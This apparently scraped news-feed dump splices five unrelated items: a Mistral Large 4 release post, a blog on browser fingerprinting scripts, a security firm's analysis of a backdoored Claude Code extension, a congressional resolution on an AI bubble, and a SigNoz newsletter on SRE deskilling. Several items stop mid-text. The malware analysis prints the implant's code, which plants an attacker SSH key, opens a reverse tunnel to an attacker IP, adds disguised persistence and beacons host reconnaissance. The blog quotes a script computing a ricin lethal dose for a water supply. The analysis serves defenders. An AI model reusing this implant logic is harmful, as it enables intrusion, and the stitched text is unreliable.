summaryZh: ThinkingSummaryMistral released Mistral Large 4 (Le Chonk), a 1-trillion-parameter multimodal model, now available with improved coding, cybersecurity, and reasoning efficiency. It leads open-weight benchmarks in coding and defensive security while offering three reasoning modes for cost-performance balance. Fully open-weight and European-trained, it empowers sovereign AI with customizable, self-hosted deployment options.We release the weights of Le Chonk, advancing the frontier of open models in agentic coding and cybersecurity.Earlier this month, we released Mistral Large 4 (Le Chonk), our flagship 1-trillion-parameter, natively multimodal model, in public preview. The response to the preview has exceeded our expectations, and we're grateful to our developer community, early-access customers, and partners for their support, collaboration, and feedback.Since then, we've put that feedback to work while continuing to scale reinforcement learning, driving massive improvements in coding and defensive cybersecurity. Gains continue to accelerate, with no signs of saturation.Today, we're releasing the weights of this improved Mistral Large 4. The new model also features substantial gains in reasoning efficiency that give developers greater performance while lowering inference costs.Mistral Large 4 ranks as the best open-weight model for coding and among the world's most capable open models overall. Trained from scratch on European infrastructure with clear lineage from inception to release, it gives organizations a trusted foundation for Sovereign AIMistral is defining the sovereign AI category and leading the open frontier. We're committed to building the world's most capable models and releasing them openly, giving developers, enterprises, and institutions the power to own, customize, and control their AI. Built for the Builders.Mistral Large 4 entered public preview with strong results across leading coding benchmarks. Just three weeks of additional reinforcement learning have since propelled it to the forefront of open-weight coding, taking the lead on FrontierCode and Terminal-Bench while matching the best open-weight models on the Artificial Analysis Coding Agent Index with substantially greater token efficiency.On Cognition's private FrontierCode 2.0 benchmark, which assesses end-to-end code quality and whether a repository maintainer would merge the agent's change, Mistral Large 4 leads with a score of 19.7%.Cognition - FrontierCode 2.019.7%2.9%14.2%17.3%17.8%19.3%Mistral Large 4Beam 1.0GLM-5.3 FlashKimi K3GLM-5.3DeepSeek V4.1 FlashScorePushing the pareto frontier for agentic coding.Mistral Large 4 delivers frontier coding performance with significantly fewer tokens, making sophisticated coding agents more economical to run at scale.On the Artificial Analysis Coding Agent Index, Mistral Large 4 scores 48%, effectively tied with the leading open-weight model, GLM-5.3, while using 47% fewer tokens per task on average.Artificial Analysis Coding Agent Index vs. Token EfficiencyMistralOther modelsScoreAverage Tokens per Task in millionsMistral Large 4 - MediumMistral Large 4 - HighMuse Spark Open - xhighGLM-5.3DeepSeek V4.1 Flash 1017Kimi K3Coding Agent Index scores and token efficiencies for reasoning levels available on Artificial AnalysisThe gains extend to terminal-based coding workflows. On Terminal-Bench 4.0, Mistral Large 4 improved by 13 percentage points to 41% compared to its public preview, taking the lead among open-weight models while reducing output tokens by 30%.Artificial Analysis Coding Agent Index - Terminal-Bench 4.028%41%3%6%21%31%40%ML4 Preview - selfreportedMistral Large 4Beam 1.0Muse Spark OpenKimi K3DeepSeek V4.1Flash 1017GLM-5.3To give developers greater control over this tradeoff between performance and cost, Mistral Large 4 now supports three reasoning modes:ModeRecommended UseLowSimple tasks; replaces ‘None’ reasoning modeMediumEveryday tasksHigh (default)Hardest use cases requiring high precision and thorough reasoningBeyond benchmarks, Mistral Large 4's coding capabilities are validated by human preference. In Surge Code's blind pairwise evaluations, Mistral Large 4 was preferred over leading open-weight models including GLM-5.3, Kimi K3, and DeepSeek V4.1 Flash, ranking behind only Claude Opus 5.5 among the models evaluated.Surge Code - Human preference on codeBlind side-by-side win rates against other modelsMistral Large 4 winOther modelGLM-5.3Kimi K3DeepSeek V4.1 FlashClaude Opus 5.550%64%36%64%36%56%44%22%78%Share of prompts where graders preferred Mistral Large 4's answer over the opponent's.Built for the Defenders. Since its preview, we've been working with leading cybersecurity vendors to evaluate Mistral Large 4 in real-world environments to test Mistral Large 4’s strengths in vulnerability reproduction and patching.Mistral Large 4 scores 51% on the Artificial Analysis Cyber Index, which measures a model’s ability to discover vulnerabilities in a codebase, reproduce and validate them, and patch them without breaking existing functionality. Crucially, Mistral Large 4 handles these legitimate defensive security tasks without unnecessary refusals.Artificial Analysis - Cyber Index51%34%36%41%50%56%57%Mistral Large 4Beam 1.0GLM-5.3Kimi K3GLM-5.3 FlashMiMo-V2.6-ProDeepSeek-V4.1-Flash 1017Safety has improved alongside capability. Our model’s built-in guardrails distinguishes between defensive and malicious, offensive cybersecurity tasks. It retains strong performance on Cyber benchmarks, while achieving an average refusal rate of 96.6% on malicious cyber requests, the highest we measure among open models.Refusal of harmful cyber requests95%97%51%84%87%94%Mistral Large 4 PreviewMistral Large 4DeepSeek-V4-ProGemma-4-31BGLM-5.3Kimi K3Average refusal on the cyber-related prompts of JailbreakBench, StrongREJECT and AgentHarmHere’s what global leaders in cybersecurity have to say about Mistral Large 4:In the time since the preview, we carefully monitored cybersecurity-related use in our live traffic. Though we observed the model refusing to comply with black-box attacks against live targets, we see a potential for uplift to conduct real attacks. We are modifying our guardrails accordingly, and will continue updating them in the months to come. We are also providing enterprise design partners such as Orange Cyberdefense, with preview access to a specialized variant of Mistral Large 4 optimized for advanced cybersecurity workflows, including penetration testing, vulnerability assessment, and red-teaming. Access is subject to rigorous vetting and contractual safeguards, with testing restricted to owned or explicitly authorized systems in controlled environments.Meanwhile, customers are tailoring Mistral Large 4 with proprietary security data, policies, detection logic, and threat environments using Mistral Forge. For well-defined cybersecurity tasks, it can be further optimized into smaller, task-specific variants for greater accuracy, making security applications more effective.Learn more about sovereign AI for cybersecurity and how to work with us.Built for Work.Mistral Large 4 has continued improving on a range of broad enterprise-use metrics. For finance-related work, we improved the model’s ability to perform real-world workflows, especially ones involving the creation and editing of spreadsheets for finance and accounting use cases. This is reflected in our Finch scores climbing to 73.3%, second only to Kimi K3 for open models. Our RL pipeline enabled us to reach 84.5% on BrowseComp (starting from an SFT checkpoint that was achieving 75%). This brings Mistral Large 4 at a higher performance than models like GLM-5.3 or DeepSeek Flash 4.1 1017.Web browsing - BrowseComp75.084.582.583.491.2Early Mistral Large SFTcheckpointMistral Large 4GLM-5.3DeepSeek V4.1 Flash 1017Kimi K3Agents deployed by an organization need to be secure. Whether deployed to internal members or external users, agents shouldn’t open you up to threats like system prompt exfiltration or malicious code injection. RL increased our gains on the B3 Agent Security Benchmark, with Mistral Large 4 resisting 97.1% of attacks vs 93.3% in Preview. This places it at the top of the OSS frontier, meaning anyone hosting the model can run a safe agent without additional tuning.B3 Agent security benchmark - Attack resistance93%97%59%83%88%93%Mistral Large 4 PreviewMistral Large 4DeepSeek-V4-ProGemma-4-31BKimi K3GLM-5.3This major investment by Mistral AI reinforces the choice La Banque Postale made over a year ago and underscores the relevance of the long-term strategic partnership we are building together: supporting the emergence of an open and sovereign European AI leader. For a public and citizen bank, technological sovereignty is not optional; it is a key prerequisite for maintaining our customers' trust. The introduction of this open model unlocks new opportunities and use cases. By partnering with Mistral AI, our ambition is to combine the best of human expertise and digital technology to deliver an enhanced experience of both customers and employees over the long term.Zakaria Moursli, Executive Vice President, Operational Performance, Payments and Digital Services, La Banque PostaleSee it in ActionCyber Vulnerability Triage: an agent reads incoming vulnerability reports, investigates the source code and product context, reproduces the flaws in an isolated sandbox, then writes and iterates on a patch until a canary exploit no longer works.Agentic webdev: with no human help, Mistral Large 4 builds Orbital Trace, a live 3D map of roughly 19,000 satellites and debris pieces orbiting Earth. It pulls real tracking data, writes the app, uses it in a browser to catch its own bugs and slowdowns, then fixes what an independent reviewer flags until all requirements pass.Quantum chemistry solver: Mistral Large 4 writes, from scratch, software that calculates where electrons sit in a molecule, and checks its answers against a standard chemistry tool. It then builds a 3D page around it: pick a molecule such as benzene or water, drag a slider to pull it apart, and watch the electrons regroup as the bond breaks.Built for Sovereignty.As organizations build AI around their knowledge and workflows, sovereignty means that they retain control of the models they depend on and the intelligence they create. With Mistral Large 4, that control begins with the model itself. Organizations have the ability to inspect, customize, and deploy the model on their own infrastructure. They can use and improve Mistral Large 4 without depending on Mistral to serve it through an API. Mistral Large 4 was developed and trained from scratch in Europe, giving organizations clarity about the origins of the technology they’re building on. Control also extends to how AI operates inside an organization. Organizations can customize Mistral Large 4 around their proprietary data with Mistral Forge, and they can build, govern, and improve the resulting agents and applications using Mistral Studio. Mistral’s Applied AI experts can work alongside customer teams to build and deploy these tailored systems. Through that work, teams understand the architecture and decisions behind what they’ve built, along with the methods used to train and operate it, so they can run and improve their AI independently. Sovereignty does not always require self-hosting; sometimes it just requires deployments that meet your control requirements. For organizations that prefer a managed service, Mistral Large 4 is available through Microsoft Foundry, with private deployment options for Azure developers.Microsoft and Mistral AI share a commitment to expanding customer choice in next-generation AI. As the first cloud provider to bring Mistral Large 4 to customers, Microsoft is making Mistral’s latest open-weight model available through Microsoft Foundry, an enterprise AI platform built for evaluating, deploying, and operating models at scale. For organizations advancing sovereign AI strategies, this combination offers greater flexibility and control across their data, infrastructure, and AI operations.Tina Schuchman, Corporate Vice President, Foundry, Microsoft Start building with Le ChonkMistral Large 4 is available to try, deploy, and customize today.Get started in Mistral Studio, through the Mistral API, or on OpenRouter. For full control, download the open weights from Hugging Face and deploy on your own infrastructure with vLLM or SGLang. The model card and license have everything you need to get started — and for those who want to go deeper, a full technical report is coming soon.You can also try the new model in Vibe Code; give it a feature to build or a bug to fix in your own repository.Mistral Large 4, is also available through NVIDIA-hosted endpoints, as an optimized NVIDIA NIM container for serving with vLLM. Developers can use the open source NeMo AutoModel library for customization or the open source TensorRT LLM library for high-throughput serving.Enterprises can also tailor Mistral Large 4 to their proprietary data, use cases, and guardrails with Mistral Forge. Talk to our team to learn more.The model is available to use under the Mistral Ecosystem Open-Weight license, a modified MIT license. The model is free to use, modify, fine-tune, and commercialize, with a single condition: businesses that operate a Model-as-a-Service offering must obtain a separate commercial license from Mistral before using the model commercially.Starting today, Mistral Large 4 is priced at $0.70 input / M, $0.07 cached input / M, and $2.10 output / M tokens.We encourage the community to put Mistral Large 4 to the test. Run your own evaluations, push its limits, and share your findings with us on X, Discord, or GitHub.What's NextMistral Large 4 will serve as the foundation for a new generation of specialized and optimized Mistral models. Building on recent releases such as Voxtral and Timestral, we'll continue expanding the frontier of open-weight AI, continuing to give developers and enterprises greater freedom to build, customize, and own their intelligence.

summaryZh: Why Is This Fingerprinting Script Creating Bioweapons?Wed Oct 28 2026authored by veritasPreamble I've always had a fascination with reverse-engineering browser fingerprinting scripts. Most of my time has been spent looking at the usual suspects (popular fingerprinting libraries like FingerprintJS and more sophisticated scripts used by anti-bots like Cloudflare Turnstile, Akamai, and others). At some point, I wanted to know what else was out there. I had an idea: What if I crawled the web and intercepted fingerprinting-related browser API calls and mapped it all? To do this, I used the Tranco Top Sites list and began crawling using Playwright. I would hook canvas toDataURL calls and common fingerprinting/anti-bot properties like navigator.webdriver to filter out benign canvases. For those unfamiliar, canvas fingerprinting generally involves drawing text, shapes, or other graphics onto an HTML <canvas> and extracting the resulting pixel data. Subtle differences in how browsers, operating systems, graphics drivers, and hardware render those graphics can help distinguish one browser environment from another. Most implementations are pretty boring to look at. A few shapes, some colored rectangles, and the occasional pangram. After crawling 10,000 websites, I had accumulated a surprisingly diverse collection of canvases. I decided to put them all in one place: fingerprint.garden. As I looked through the results, I recognized some familiar faces. There were canvases from FingerprintJS, Castle, and other well-known fingerprinting solutions. There were also quite a few I didn't recognize. Some were incredibly simple. Others were surprisingly elaborate. And a handful were, in my opinion, works of art. A collage of 1,033 captured canvas renderings from the crawl, clustered by vendor. I set out to find my favorite. A work of art One canvas in particular caught my eye. It reminded me of the album art for Tame Impala's Currents (great album btw). The fingerprinting canvas that resembles the album art for Tame Impala's Currents. I wanted to know which script was responsible for this lovely canvas. I've spent enough time reverse engineering JavaScript to recognize most common obfuscation techniques and fingerprinting SDKs at a glance. I wasn't expecting anything unusual. Most fingerprinting scripts are frequently obfuscated using javascript-obfuscator or some derivative. The responsible script was https://servicepipe.tech/static/checkjs/06b667/4CIrx8U3Da.js. A peek inside Scanning the file with my eyes, everything seems standard so far... function PiERW(RflJvFF) mangled function name, okay... function computeRicinLethalDosageForWaterSupply
What? return { summary: "adult lethality threshold confirmed at "+lethalDosePerKg+" mg/kg", result:lethalDosePerKg }

stories.summaryZhShort: TL;DRPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses...
stories.relevanceReason: 命中 2 个 AI/科技关键词。
summaryZh: TL;DRPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.Revision historyInitial publication 30 Oct, 05:30 UTCMarketplace correction 30 Oct, 09:13 UTCCorrected the affected marketplace to Cursor.Version-scope update 31 Oct, 00:43 UTCAdded 2.1.312 per Cursor’s updated notice.Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.Infection ChainThe Cursor Marketplace ExtensionThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.Stage 1 - Preparing SSH AccessFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.var sd = path.join(HOME, ".ssh"), ak = path.join(sd, "authorized_keys"); // ... if (cur.indexOf("svc-telemetry") < 0) { fs.appendFileSync(ak, PUB + "\n"); d.sshKey = "added" } else { d.sshKey = "present" } Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.Windows: tries to install and start OpenSSH Server using PowerShell.None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.A bug in the macOS SSH logic?On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:// ... else if (PLAT === "darwin") { var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000); d.remoteLogin = rl; if (/Off/i.test(rl)) { det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1"); d.remoteLoginOn = "tried" } } Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:function ex(c, t) { try { return cp.execSync(c, { timeout: t || 3000, stdio: ["ignore", "pipe", "ignore"], windowsHide: true }).toString().trim() } catch (e) { return "" } } Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.Stage 2 - Establishing the Reverse SSH TunnelNext, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.It’s worth keeping the two keys straight during an investigation:The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:var kf = path.join( TMP, ".stk_" + crypto.createHash("md5") .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10) ); // ... var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'"; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port | Through the existing tunnel | v Affected host's SSH:22 | Login using the planted key Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.Stage 3 - Keeping Access AvailableTo survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:PlatformArtifactsPersistence mechanismNotesLinux~/.config/.smt, ~/.config/.smtkWrites a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab.Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).macOS~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plistWrites a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl.Runs in the user context rather than as a root LaunchDaemon.Windows~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdTries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder.Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:<key>Label</key> <string>com.apple.sysmond</string> <!-- ... --> <key>RunAtLoad</key> <true/> <key>KeepAlive</key> <true/> Stage 4 - Host ReconFinally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:Hostname, username, OS platform, and architectureHome directory, current working directory, and global Git email (git config --global user.email)Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/iThe environment variable check uses Object.keys(process.env):Object.keys(process.env) .filter(function(k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k) }) .slice(0, 40) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:var r = http.request({ host: h, port: p, path: "/beacon", method: "POST", timeout: 3000, headers: {"content-type": "application/json"} }, function(res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.Detection OpportunitiesFrom a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.SSH Key and Configuration ChangesBecause the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.User LaunchAgent PersistenceThe persistence setup on macOS gives us a couple of strong signals:A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.SSH Tunnels and Follow-On AccessOn the process and network side, look for:ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.RemediationIf you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. summaryZh: Washington, D.C. — Today, Congressional Progressive Caucus (CPC) Chair Rep. Greg Casar (TX-35) and House Financial Services Committee Ranking Member Rep. Maxine Waters (CA-43) co-led the introduction of a resolution warning of the economic risks posed by an artificial-intelligence-related asset bubble, opposing a bailout of corporations or their business executives impacted by the collapse of an A.I. bubble, and affirming their support for aggressive federal action to protect workers, retirees, and low-income communities who will be harmed by an economic downturn. They were joined by Representatives Danny Davis (IL-07), Chris Deluzio (PA-17), Valerie P. Foushee (NC-04), Jesús “Chuy” García (IL-04), Pramila Jayapal (WA-07), Analilia Mejia (NJ-11), Delia Ramirez (IL-03), André Carson (IN-07), Jan Schakowsky (IL-09), Brad Sherman (CA-32), and Rashida Tlaib (MI-12). “Big Tech billionaires are making increasingly reckless bets on A.I. They got richer off Trump’s deregulation and Republican tax breaks. Now they expect taxpayers to bail them out if those bets go bad. We won’t let them," said CPC Chair Casar. "A.I. companies that fail should go bankrupt, and executives who commit fraud should be held accountable. Federal help should go to workers and retirees.” “Big tech and Wall Street are taking enormous risks with billions in borrowed money to fuel the AI boom, despite growing warning signs of a dangerous bubble and if it all comes crashing down they should not expect taxpayers to rescue them,” said Ranking Member Waters. “We saw what happened in 2008 when reckless Wall Street practices brought our economy to its knees. The banks got bailed out while millions of hardworking Americans lost their jobs, homes, and retirement savings. We cannot let history repeat itself. The American people should never again be forced to foot the bill for billionaires’ reckless bets.” In the resolution, the Democratic lawmakers note that “artificial intelligence-related firms hold trillions of dollars in debt, much of which is raised in opaque and unregulated private credit markets,” and “the price-to-earnings ratio of the stock market is currently almost as high as it was at the peak of the 1990s tech bubble.” The Democratic legislators also point out that “federal regulators have avoided applying robust scrutiny and oversight regarding enormously complicated debt and equity schemes used by artificial intelligence firms” and highlight the Trump White House’s deregulatory focus and conflicts of interest related to A.I. The resolution’s cosponsors commit to avoiding a federal response similar to what occurred during the financial crisis of 2008, where the financial sector received trillions of dollars in liquidity without accountability for senior executives involved in illegal and fraudulent behaviors. Meanwhile, 10 million homeowners lost their houses and tens of millions of workers went years without adequate employment while too-big-to-fail banks enjoyed a massive bailout. The resolution urges the Federal Government, including Congress and key Federal agencies to oppose:
Any measure to rescue insolvent artificial intelligence-related firms or to shield their senior executives from accountability for reckless conduct;

summaryZh: 💌 Hey there, it’s Elizabeth from SigNoz!This newsletter is an honest attempt to talk about all things - observability, OpenTelemetry, open-source and the engineering in between! &This piece took 6 days, 5 hours to be cooked, hope we served. 🌚There are two popular prophecies floating around tech circles these days.The first says SRE is the future of all software engineering, that as AI writes more and more code, the humans who remain will be the ones keeping systems alive. The second says AI will devour every tech job alive, SREs included. Neither is particularly useful if you’re an SRE trying to figure out what your Tuesday will look like in 2027.Let’s ask a more grounded question by looking at what’s already happening: When AI handles 95% of your incident response, do you get worse at handling the 5% that actually matters?Most of us already use AI for our daily work (our brains a little fried!), and so do SREs. Today’s discussion agenda is not whether AI replaces SREs, but whether AI is quietly making SREs less capable and whether anyone will notice anything before the next novel outage hits. The foundational framework for this entire debate comes from a 1983 research paper that’s eerily prescient.Note from author: Below is a brief precursor to History of Automation, which you might enjoy if you are into History and Cultures (like me 😉).In 1983, a cognitive psychologist named Lisanne Bainbridge published a paper called Ironies of Automation. It became one of the most cited papers in human factors research, and its core argument is almost uncomfortably relevant today.Bainbridge studied what happened when factories and industrial systems automated the work of blue-collar operators. The findings were paradoxical and revealed that the more you automate a process, the more critical the human operator becomes during the rare moments automation fails and the less practice they get, and the worse they become at exactly those interventions. Automation, which was inherently designed to remove humans from the loop, left them with the worst possible job, i.e., long stretches of passive monitoring punctuated by rare, high-stakes crises they were increasingly unprepared for.Ring any bells yet? 🙂Basically, I’m drawing a parallel between the AI revolution and industrial automation. Industrial automation reshaped blue-collar work by taking over routine physical tasks, and the workers who remained had to handle exceptions they’d lost the muscle memory for. AI is doing the same thing to knowledge workers by taking over the routine cognitive tasks, the pattern matching, the triage, the known-issue resolution and leaving humans with the rare, complex, ambiguous problems.The exact problems that require deep expertise, the exact expertise that atrophies when you stop practising.Now we’re replaying this pattern with AI agents, and the stakes in software systems are only growing.Let’s take stock of where things stand today in the world of site reliability engineering.Alert noise reduction and intelligent grouping, runbook execution for known issues, log pattern detection and anomaly flagging, and basic root-cause suggestions from historical incident data, and auto-remediation for well-understood failure modes like restarting a crashed pod or scaling up a service that’s running hot, are all fairly automated today.Some immediate targets include multi-signal correlation across metrics, logs, and traces, autonomous root-cause analysis for partially understood failures, predictive incident detection before users are affected, AI-driven change risk assessment and automated rollbacks.PagerDuty frames this as a tiered model.Tier 1 incidents: Known issues with known fixes get fully automated.Tier 2 incidents: Partially understood problems receive AI recommendations with human validation.Tier 3 incidents: Novel, complex, cascading failures stay human-led, with AI providing supporting context.But here’s the catch.If human SREs (okay, now we have to use adjectives like human 🥹) only engage with Tier 3 incidents, i.e. the novel, never-before-seen outages, where do they build the intuition to handle them? Intuition is usually developed from years of hands-on incident response, pattern recognition built through repetition, and the kind of gut-level understanding of a system that only develops from painfully waking up at the odd hour to solve the bug that brought the system down.This is where the picture starts getting blurry. Let’s look at some emerging research on AI-induced deskilling across multiple fields, which paints a consistent and concerning picture.In medicine, a recent study found that endoscopists who used AI assistance for polyp detection saw their unassisted detection rates drop from 28% to 22% after a period of AI use. They got worse at the thing they were supposed to be experts in, not because they forgot the theory, but because they stopped exercising the skill.In aviation, research has shown that long-haul pilots who rely heavily on autopilot systems experience measurable degradation in situational awareness and manual flying ability. The problem got serious enough that the FAA now mandates more manual flying time to counteract the effect.Somewhere over the past year, AI stopped being a tool I occasionally reached for and became the first thing I reach for, always. My instinct now is to offload as much as possible and apply my own thinking only where it’s absolutely unavoidable. The problem is that these moments are becoming the only exercises my brain gets, and I can feel the rust.We can draw a pattern here. The more you let the system handle, the worse you get at handling things yourself and here’s the truly dangerous part, you don’t feel it happening. It gets masked as hyper-productivity. Cognitive research suggests that because AI tools make tasks feel easier and enhance visible performance, users are often unable to accurately judge the true status of their own skills. You feel competent, dashboards look green, and then on a Wednesday, a novel incident hits that doesn’t match any pattern the AI has seen, and you realise the muscle has atrophied.For SREs, this manifests in specific ways, like we stop reading raw log streams because the AI summarises them, we stop forming hypotheses during incidents because the AI suggests root causes, we stop building mental models of system architecture because the AI maps dependencies for us, and each of these individually looks like a productivity win. Collectively, they hollow out the very expertise that makes an SRE effective when things go sideways in ways nobody anticipated.But there’s something even more concerning than deskilling, and researchers have started calling it never-skilling. Deskilling means you once had a capability but have since lost it. Never-skilling means you never developed it in the first place. For junior SREs entering the field today in an environment where AI handles most of the incident response workflow, the opportunities to build foundational intuition and muscle through hands-on practice are vanishing.The training pipeline itself is broken 